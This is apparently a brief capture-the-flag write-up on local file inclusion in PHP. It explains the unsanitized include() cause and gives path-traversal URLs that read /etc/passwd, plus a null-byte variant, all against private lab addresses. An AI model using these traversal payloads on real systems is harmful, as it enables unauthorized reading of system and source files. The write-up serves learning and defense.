## 1 About
This occurs when a PHP script includes files based on user input, and the input isn’t sanitized

## 2 The signs
Check the home address:
http://172.16.60.128/?page=home
The '?page' is good a reason to suggest an issue with LFI

## 3 How to find
Try this address:
http://10.39.42.166/?page=../../../../../../../etc/passwd
You'll get an alert with the flag

## 4 Why it works?
The backend uses something like:
include($_GET['page'] . '.php');

Without sanitization it becomes:
include('../../../../etc/passwd.php');

/etc/passwd is not a PHP file. And with a null byte injection
http://172.16.60.128/?page=../../../../etc/passwd%00
We could get access to the backend source code